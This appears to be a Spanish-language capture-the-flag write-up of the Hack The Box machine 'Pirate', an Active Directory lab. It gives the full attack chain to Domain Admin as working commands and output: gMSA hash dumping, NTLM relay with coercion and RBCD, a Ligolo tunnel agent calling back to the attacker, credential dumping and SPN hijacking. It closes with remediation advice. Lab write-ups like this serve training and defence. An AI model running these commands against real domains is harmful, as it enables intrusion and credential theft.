# HTB Machine Report — Pirate

**Date:** 2026-05-27
**Author:** Franksimon
**Platform:** Hack The Box
**Difficulty:** HARD
**OS:** Windows (Active Directory)
**IP:** 10.129.244.95 (DC01) / Red interna: 192.168.100.0/24
**Status:** Pwned

---

## 1. Executive Summary

Pirate es una máquina Windows Active Directory de dificultad Hard. El acceso inicial se logra abusando del grupo **Pre-Windows 2000 Compatible Access** para autenticar como `MS01$` con contraseña predeterminada y dumpear el hash NTLM de `gMSA_ADFS_prod$`, obteniendo shell WinRM en DC01. Con Ligolo-ng como pivote hacia la red interna, se combina NTLM relay con RBCD para comprometer WEB01 como Administrator (user flag). La escalación a Domain Admin encadena ForceChangePassword sobre `a.white_adm`, SPN hijacking contra DC01 usando WriteSPN del grupo IT, y S4U2Proxy con `-altservice` para obtener un ticket válido contra el DC.

**Cadena de ataque:**
```
MS01$ (Pre-Win2000) → gMSA dump → evil-winrm DC01 → Ligolo pivot
→ NTLM relay + RBCD → Admin WEB01 (user flag) → secretsdump
→ ForceChangePassword → SPN hijack → S4U altservice → Domain Admin
```

---

## 2. Enumeration

### 2.1 Port Scan — DC01

```bash
sudo nmap -Pn -sC -sV 10.129.244.95
```

| Port     | Service    |
|----------|------------|
| 88/tcp   | Kerberos   |
| 389/tcp  | LDAP       |
| 445/tcp  | SMB        |
| 636/tcp  | LDAPS      |
| 3268/tcp | Global Catalog |
| 5985/tcp | WinRM      |

Dominio: `pirate.htb` — DC01.pirate.htb

### 2.2 Pre-Windows 2000 Compatible Access → gMSA Dump

El grupo **Pre-Windows 2000 Compatible Access** contiene `MS01$` y `EXCH01$`, cuentas de máquina con contraseña predeterminada (nombre en minúsculas). Con el TGT de `MS01$` se puede leer `msDS-ManagedPassword` de cuentas gMSA.

```bash
getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95

KRB5CCNAME=MS01$.ccache python3 gMSADumper.py \
  -u 'MS01$' -k -d pirate.htb -l 10.129.244.95
```

![gMSA dump](screenshots/pirate_gmsa_dump.png)

Hash NTLM de `gMSA_ADFS_prod$` obtenido. Esta cuenta es miembro de **Remote Management Users** en DC01.

---

## 3. Acceso Inicial — evil-winrm como gMSA_ADFS_prod$

```bash
evil-winrm -i 10.129.244.95 -u 'gMSA_ADFS_prod$' -H '<NTLM_HASH>'
```

![evil-winrm DC01](screenshots/pirate_evilwinrm.png)

Shell como `pirate\gmsa_adfs_prod$` en DC01.

---

## 4. Ligolo-ng — Pivot a 192.168.100.0/24

Desde evil-winrm en DC01 se sube el agente y se establece el tunnel:

```bash
# Kali
./proxy -selfcert -laddr 0.0.0.0:11601

# DC01 (evil-winrm)
upload agent.exe
.\agent.exe -connect 10.10.14.207:11601 -ignore-cert
```

![Ligolo agente conectando](screenshots/pirate_ligolo_connect.png)

![Ligolo agente unido](screenshots/pirate_ligolo_joined.png)

```bash
# Kali — activar ruta
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
```

![Ligolo sesión activa](screenshots/pirate_ligolo_session.png)

WEB01 (192.168.100.2) ahora accesible. Nmap confirma SMB **signing: enabled but not required** → vulnerable a relay.

---

## 5. NTLM Relay + RBCD → Admin en WEB01

```bash
# Terminal 1
sudo ntlmrelayx.py -t ldaps://10.129.244.95 \
  --delegate-access --remove-mic -smb2support

# Terminal 2
coercer coerce -l 10.10.14.207 -t 192.168.100.2 \
  -d pirate.htb -u pentest -p 'p3nt3st2025!&' --always-continue
```

![RBCD exitoso](screenshots/pirate_rbcd_success.png)

```
[*] Authenticating against ldaps://10.129.244.95 as PIRATE/WEB01$
[*] Adding new computer with username: WIHDYOOD$ and password: /p/u+d2(o13llbH result: OK
[*] Delegation rights modified successfully!
[*] WIHDYOOD$ can now impersonate users on WEB01$ via S4U2Proxy
```

```bash
# Sincronizar reloj
sudo ntpdate -u 10.129.244.95
# 2026-05-27 04:18:06.312848 (-0600) +719.012374 +/- 0.036244

# Ticket S4U como Administrator
getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator \
  -dc-ip 10.129.244.95 'pirate.htb/WIHDYOOD$:/p/u+d2(o13llbH'
# [*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

# Shell en WEB01
KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache \
  wmiexec.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```

---

## 6. Post-Exploitation — WEB01

### User Flag

```
C:\Users\a.white\Desktop> type user.txt
8780c8e8b4a4f1bb4627760352cc920f
```

### Credential Dump

```bash
KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache \
  secretsdump.py -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb
```

Resultado relevante de LSA Secrets:

```
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

---

## 7. Privilege Escalation — Domain Admin

### BloodHound

```bash
bloodhound-python -u a.white -p 'E2nvAOKSz5Xz2MJu' \
  -d pirate.htb -ns 10.129.244.95 -c All --zip
```

Hallazgos clave:

```
a.white ──ForceChangePassword──► a.white_adm
a.white_adm ──memberOf──► IT
IT ──WriteSPN──► DC01$
```

`a.white_adm`: `trustedtoauth=true`, `AllowedToDelegate=http/WEB01.pirate.htb`

### ForceChangePassword

```bash
net rpc password a.white_adm 'Pirate123!' \
  -U 'pirate.htb/a.white%E2nvAOKSz5Xz2MJu' -S 10.129.244.95
```

### SPN Hijacking

`a.white_adm` delega a `http/WEB01.pirate.htb`. Al mover ese SPN de WEB01$ a DC01$ (usando WriteSPN del grupo IT), el S4U2Proxy apunta ahora al DC.

```bash
# Quitar SPN de WEB01$
python3 addspn.py -u 'pirate\a.white_adm' -p 'Pirate123!' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r 10.129.244.95
# [+] SPN Modified successfully

# Inyectar SPN en DC01$
python3 addspn.py -u 'pirate\a.white_adm' -p 'Pirate123!' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' 10.129.244.95
# [+] SPN Modified successfully
```

### S4U2Proxy + altservice → Domain Admin

```bash
getST.py -spn 'http/WEB01.pirate.htb' \
  -altservice 'host/DC01.pirate.htb' \
  -impersonate Administrator \
  -dc-ip 10.129.244.95 \
  'pirate.htb/a.white_adm:Pirate123!'
# [*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB
#                         to host/DC01.pirate.htb@PIRATE.HTB
# [*] Saving ticket in Administrator@host_DC01.pirate.htb@PIRATE.HTB.ccache

KRB5CCNAME=Administrator@host_DC01.pirate.htb@PIRATE.HTB.ccache \
  wmiexec.py -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
```

---

## 8. Root Flag

```
C:\Users\Administrator\Desktop> type root.txt
cb58d84bd134cb4a8496837cedcd152c
```

`whoami → pirate\administrator` en DC01. Domain Admin.

---

## 9. Remediation

| Finding | Recomendación | Prioridad |
|---------|--------------|-----------|
| Pre-Win2000 cuentas activas | Quitar del grupo; rotar contraseñas | Critical |
| gMSA legible por cuentas de máquina | Auditar msDS-GroupMSAMembership | High |
| SMB signing no requerido (WEB01) | Habilitar via GPO | Critical |
| LDAP signing no requerido (DC01) | Requerir firma LDAP | Critical |
| ForceChangePassword sobre cuenta admin | Auditar ACLs con BloodHound | High |
| WriteSPN de grupo IT sobre DC01 | Restringir a Domain Admins | High |
| trustedtoauth + constrained delegation | Usar gMSA para servicios | High |

---

## 10. Lessons Learned

- **Pre-Win2000 Compatible Access** es el vector más fácil de pasar por alto — siempre enumerar sus miembros.
- **`--remove-mic`** en ntlmrelayx es obligatorio para relay a LDAPS.
- **SPN hijacking:** WriteSPN en un objeto de computadora permite redirigir a quién apunta una delegación existente sin tocar `msDS-AllowedToDelegateTo`.
- **`-altservice`** en getST.py relabelea el TGS resultante para usarlo con la herramienta correcta (wmiexec usa `host/`).
- **`/etc/krb5.conf`** es obligatorio para GSSAPI en Linux — sin él evil-winrm falla silenciosamente.

---

## 11. References

- [Pre-Windows 2000 Compatible Access](https://www.thehacker.recipes/ad/movement/dacl/pre-windows-2000-computers)
- [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- [NTLM Relay + RBCD — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [krbrelayx / addspn.py](https://github.com/dirkjanm/krbrelayx)
